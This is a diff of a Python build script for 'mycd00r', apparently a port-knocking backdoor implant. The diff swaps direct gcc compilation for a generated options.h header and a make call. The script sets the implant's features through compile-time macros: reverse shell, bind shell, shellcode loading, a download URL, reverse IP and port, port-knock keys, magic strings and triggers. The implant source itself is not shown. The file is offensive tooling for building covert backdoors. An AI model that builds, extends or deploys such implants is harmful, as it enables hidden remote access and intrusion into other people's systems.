@@ -1,174 +1,78 @@
 import csv
 import datetime
 import argparse
-import binascii
 import os
 import subprocess
-import shutil
 
-IMPLANT_DIR = "../mycd00r/"
-BUILD_DIR = "../mycd00r/build/"
-BUILD_LIB_DIR = BUILD_DIR + "lib/"
-INCLUDE_DIR = ["../mycd00r/include/"]
-CODE_DIR = ["../mycd00r/lib/", "../mycd00r/"]
-BUILD_DIRS = [BUILD_DIR, BUILD_LIB_DIR]
+FILE = "../mycd00r/include/options.h"
+MAKE_PATH = "../mycd00r"
 
-def make_dir(dir):
-    try:
-        os.mkdir(dir)
-        print(f"[+] Folder '{dir}' created successfully.")
-    except FileExistsError:
-        print(f"[!] Folder '{dir}' already exists.")
-    except FileNotFoundError:
-        print(f"[!] Parent directory not found.")
-    except Exception as e:
-        print(f"[!] An error occurred: {e}")
-
-
-def compile_c_file(source_file, output_file, cflags, argflags):
-
-    compile_command = ["gcc"] + cflags + ["-o", output_file, "-c", source_file] + argflags
-
-    for dir in BUILD_DIRS:
-        if not os.path.exists(dir):
-            make_dir(dir)
+def make_header_file(file):
+    macros = get_arg_flags()
     
-    print(f"\033[92m[+]\033[0m Running: {' '.join(compile_command)}")
-    print(f"\033[92m[+]\033[0m building {output_file}")
-    result = subprocess.run(compile_command, capture_output=True, text=True)
+    with open(file, "w") as f:
+        f.write("#ifndef OPTIONS_H\n")
+        f.write("#define OPTIONS_H\n\n")
+        for macro in macros:
+            f.write(macro + "\n")
+        f.write("\n#endif\n")
 
-    if result.returncode != 0 or result.stdout or result.stderr:
-        if result.stdout:
-            print(result.stdout)
-        if result.stderr:
-            stderr_lines = result.stderr.splitlines()
-            warnings = [line for line in stderr_lines if "warning:" in line.lower()]
-            errors = [line for line in stderr_lines if "error:" in line.lower()]
+    return
 
-            if warnings:
-                print(f"  \033[93m[*]\033[0m Warnings in {source_file}:")
-                for warning in warnings:
-                    print(f"  {warning}")
+def make():
+    make_header_file(FILE)
 
-            if errors:
-                print(f"  \033[91m[!]\033[0m Errors in {source_file}:")
-                for error in errors:
-                    print(f"  {error}")
-                return False
+    make_cmd = ["make", "-C", MAKE_PATH]
 
-    return True
+    if args.clean:
+        make_cmd.append("clean")
 
-def link_object_files(object_files, ldflags):
-    cflags = []
-    if args.strip:
-        cflags.append("-s")
-    if args.debug:
-        cflags.append("-g")
-    compile_command = ["gcc"] + cflags + ["-o", IMPLANT_DIR + args.outputName] + object_files + ldflags
-    print(f"\033[92m[+]\033[0m Running: {' '.join(compile_command)}")
-    print(f"\033[92m[+]\033[0m building: {args.outputName} in {IMPLANT_DIR}")
-    result = subprocess.run(compile_command, capture_output=True, text=True)
+    if args.outputName:
+        make_cmd.append(f"TARGET={args.outputName}")
 
-    if result.returncode != 0 or result.stdout or result.stderr:
-        if result.stdout:
-            print(result.stdout)
-        if result.stderr:
-            print(result.stderr)
-        if result.returncode != 0:
-            print(f"[!] Error compiling {args.outputName}")
-            return False
-    
-    return True
-
-def get_code_files():
-    code_files = []
-    for dir in CODE_DIR:
-        for file in os.listdir(dir):
-            if ".c" in file:
-                code_files.append(dir+file)
-    return code_files
-
-def get_object_files(code_files):
-    object_files = []
-    for file in code_files:
-        object_file = file.replace(".c", ".o")
-        object_file = object_file.replace(IMPLANT_DIR, BUILD_DIR)
-        object_files.append(object_file)
-    return object_files
+    subprocess.run(make_cmd)
 
 def get_arg_flags():
     arg_flags = []
 
     if args.debug:
-        arg_flags.append("-DDEBUG")
+        arg_flags.append("#define DEBUG")
     if args.interface:
-        arg_flags.append("-DCDR_INTERFACE=\"" + args.interface + "\"")
+        arg_flags.append("#define CDR_INTERFACE \"" + args.interface + "\"")
     if args.ipAddress != "unknown":
         addrs = args.ipAddress.split(",")
         addrs = ['"' + s + '"' for s in addrs]
         addrs = ', '.join(addrs)
-        arg_flags.append("-DCORRECT_IP_LIST={" + addrs + "}")
+        arg_flags.append("#define CORRECT_IP_LIST {" + addrs + "}")
     if args.downloadURL:
-        arg_flags.append("-DDOWNLOAD_URL=\"" + args.downloadURL + "\"")
+        arg_flags.append("#define DOWNLOAD_URL \"" + args.downloadURL + "\"")
     if args.bang:
-        arg_flags.append("-DBANG")
+        arg_flags.append("#define BANG")
     if args.loadShellcode:
-        arg_flags.append("-DSHELLCODE")
+        arg_flags.append("#define SHELLCODE")
     if args.reverseShell:
-        arg_flags.append("-DREVERSE_SHELL")
+        arg_flags.append("#define REVERSE_SHELL")
     if args.bindShell:
-        arg_flags.append("-DBIND_SHELL")
+        arg_flags.append("#define BIND_SHELL")
     if args.key:
         if args.activate == "PORT_KNOCK_LIST":
-            arg_flags.append("-DCDR_PORTS={" + args.key + "}")
+            arg_flags.append("#define CDR_PORTS {" + args.key + "}")
         elif args.activate == "MAGIC_PORT_STRING":
-            arg_flags.append("-DMAGIC_STRING=\"" + args.key + "\"")
+            arg_flags.append("#define MAGIC_STRING \"" + args.key + "\"")
     if args.size:
-        arg_flags.append("-DCDR_PORTS_SIZE=" + args.size)
+        arg_flags.append("#define CDR_PORTS_SIZE " + args.size)
     if args.activate:
-        arg_flags.append("-D" + args.activate)
+        arg_flags.append("#define " + args.activate)
     if args.reverseIP:
-        arg_flags.append("-DREVERSE_IP=\"" + args.reverseIP  + "\"")
+        arg_flags.append("#define REVERSE_IP \"" + args.reverseIP  + "\"")
     if args.reversePort:
-        arg_flags.append("-DREVERSE_PORT=" + args.reversePort)
+        arg_flags.append("#define REVERSE_PORT " + args.reversePort)
     if args.timeDelay:
-        arg_flags.append("-DDELAY_TIME=" + args.timeDelay)
+        arg_flags.append("#define DELAY_TIME " + args.timeDelay)
     if args.trigger:
-        arg_flags.append("-DTRIGGER=\"" + args.trigger + "\"")
+        arg_flags.append("#define TRIGGER \"" + args.trigger + "\"")
 
     return arg_flags
-
-def build():
-    code_files = get_code_files()
-    object_files = get_object_files(code_files)
-    CFLAGS = ["-Wall"] + ["-I" + s for s in INCLUDE_DIR]
-    if args.debug:
-        CFLAGS.append("-g")
-    LDFLAGS = ["-lcrypto", "-lssl", "-lpcap", "-lcurl"]
-    arg_flags = get_arg_flags()
-
-    for i, file in enumerate(code_files):
-        if not compile_c_file(file, object_files[i], CFLAGS, arg_flags):
-            return False
-        
-    link_object_files(object_files, LDFLAGS)
-        
-def clean():
-    for dir in BUILD_DIRS:
-        if not os.path.exists(dir):
-            continue
-        try:
-            shutil.rmtree(dir)
-            print(f"Directory '{dir}' and its contents have been removed successfully.")
-        except FileNotFoundError:
-            print(f"Error: Directory '{dir}' not found.")
-        except OSError as e:
-            print(f"Error: {e}")
-    try:
-        os.remove(IMPLANT_DIR + args.outputName)
-        print(f"{args.outputName} deleted")
-    except:
-        print(f"{args.outputName} file not found")
 
 parser = argparse.ArgumentParser(
     "python compiler.py",
@@ -350,11 +254,5 @@ with open("log.csv", mode="a+") as log_file:
         ]
     )
 
-
-
-
-
-if args.clean:
-    clean()
-else:
-    build()
+if __name__ == '__main__':
+    make()
